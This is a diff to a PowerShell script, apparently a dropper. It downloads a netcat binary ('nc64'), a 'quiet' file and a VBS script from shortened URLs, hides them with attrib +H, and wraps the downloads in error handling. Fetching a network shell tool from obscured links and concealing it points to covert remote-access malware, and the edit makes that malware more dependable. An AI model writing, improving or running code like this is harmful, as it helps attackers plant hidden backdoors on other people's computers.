@@ -32,10 +32,15 @@ $scriptVbsPath = Join-Path $installPath "script.vbs"
 $quietTxtUrl = "https://rb.gy/mx0i5"
 $nc64TxtUrl = "https://rb.gy/guty9"
 
-# Download files
-Invoke-WebRequest -Uri $quietTxtUrl -OutFile $quietTxtPath
-Invoke-WebRequest -Uri $nc64TxtUrl -OutFile $nc64TxtPath
-Invoke-WebRequest -Uri $scriptVbsUrl -OutFile $scriptVbsPath
+# Download files with error handling
+try {
+    Invoke-WebRequest -Uri $quietTxtUrl -OutFile $quietTxtPath
+    Invoke-WebRequest -Uri $nc64TxtUrl -OutFile $nc64TxtPath
+    Invoke-WebRequest -Uri $scriptVbsUrl -OutFile $scriptVbsPath
+} catch {
+    Write-Output "Failed to download files: $_"
+    exit
+}
 
 # Make the downloaded files hidden
 attrib +H $quietTxtPath
